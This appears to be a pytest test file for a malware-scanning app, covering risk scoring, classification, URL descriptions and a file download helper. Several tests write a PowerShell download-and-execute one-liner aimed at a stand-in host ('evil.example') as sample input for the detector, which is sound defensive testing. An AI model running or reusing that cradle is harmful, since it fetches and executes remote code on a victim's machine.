import threading
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from app import download_url_to_temp_file
from malware_scanner import analyze_file, describe_url_content, identify_url


def test_suspicious_script_is_flagged(tmp_path):
    suspicious = tmp_path / "payload.ps1"
    suspicious.write_text("powershell -ExecutionPolicy Bypass -EncodedCommand IEX(New-Object Net.WebClient).DownloadString('http://evil.example')")

    result = analyze_file(str(suspicious))

    assert result["risk_level"] in {"Medium Risk", "High Risk"}
    assert result["score"] >= 45
    assert "malware_probability" in result
    assert 0 <= result["malware_probability"] <= 100
    assert isinstance(result["threat_categories"], list)
    assert result["recommendation"]


def test_mixed_script_and_url_is_not_stuck_at_46(tmp_path):
    mixed_file = tmp_path / "mixed.txt"
    mixed_file.write_text("powershell http://evil.example")

    result = analyze_file(str(mixed_file))

    assert result["malware_probability"] > 46
    assert result["risk_level"] in {"Medium Risk", "High Risk"}


def test_safe_text_is_low_risk(tmp_path):
    safe_file = tmp_path / "notes.txt"
    safe_file.write_text("hello world\nthis is a normal text document for a demo.")

    result = analyze_file(str(safe_file))

    assert result["risk_level"] == "Low Risk"
    assert result["malware_probability"] < 30
    assert result["recommendation"]


def test_classification_and_assistant_summary_are_present():
    suspicious = Path("tmp_assistant_check.ps1")
    suspicious.write_text("powershell -ExecutionPolicy Bypass -EncodedCommand IEX(New-Object Net.WebClient).DownloadString('http://evil.example')")

    result = analyze_file(str(suspicious))

    assert result["classification"] in {"SAFE", "SUSPICIOUS", "MALICIOUS", "UNKNOWN"}
    assert "assistant_analysis" in result or "analysis" in result
    assert isinstance(result.get("assistant_analysis") or result.get("analysis"), str)

    suspicious.unlink(missing_ok=True)


def test_identification_and_security_are_separate_and_detailed():
    suspicious = Path("tmp_identify_check.ps1")
    suspicious.write_text("powershell -ExecutionPolicy Bypass -EncodedCommand IEX(New-Object Net.WebClient).DownloadString('http://evil.example')")

    result = analyze_file(str(suspicious))

    assert "content_identification" in result
    assert "security_analysis" in result
    assert isinstance(result["content_identification"], dict)
    assert isinstance(result["security_analysis"], dict)
    assert result["content_identification"]["file_category"] in {"Script", "Executable", "Other or unknown"}
    assert result["security_analysis"]["classification"] in {"SAFE", "SUSPICIOUS", "MALICIOUS", "UNKNOWN"}

    suspicious.unlink(missing_ok=True)


def test_url_descriptions_call_out_piracy_and_game_platforms():
    pirate_url = "https://thepiratebay.org/torrent/12345"
    game_url = "https://www.goggames.com/download-game/setup.exe"

    pirate_summary = describe_url_content(pirate_url, identify_url(pirate_url))
    game_summary = describe_url_content(game_url, identify_url(game_url))

    assert "piracy" in pirate_summary.lower() or "copyright" in pirate_summary.lower() or "torrent" in pirate_summary.lower()
    assert "game" in game_summary.lower() or "gaming" in game_summary.lower() or "download" in game_summary.lower()


def test_download_url_to_temp_file(tmp_path):
    content = "powershell -ExecutionPolicy Bypass -EncodedCommand IEX(New-Object Net.WebClient).DownloadString('http://evil.example')"
    safe_dir = tmp_path / "downloads"
    safe_dir.mkdir()

    server = ThreadingHTTPServer(("127.0.0.1", 0), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, directory=str(tmp_path), **kwargs))
    port = server.server_address[1]
    file_path = tmp_path / "remote.ps1"
    file_path.write_text(content)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    try:
        local_path = download_url_to_temp_file(f"http://127.0.0.1:{port}/remote.ps1", str(safe_dir))
        assert Path(local_path).exists()
        assert "powershell" in Path(local_path).read_text(errors="ignore").lower()
    finally:
        server.shutdown()
        server.server_close()


def test_detection_engine_lists_required_checks():
    suspicious = Path("tmp_payload.ps1")
    suspicious.write_text("powershell -ExecutionPolicy Bypass -EncodedCommand IEX(New-Object Net.WebClient).DownloadString('http://evil.example')")

    result = analyze_file(str(suspicious))

    required_checks = {
        "Hash checking",
        "Antivirus signature scanning",
        "Static file analysis",
        "URL reputation checking",
    }

    assert required_checks.issubset(set(result["detection_engine"]))

    suspicious.unlink(missing_ok=True)
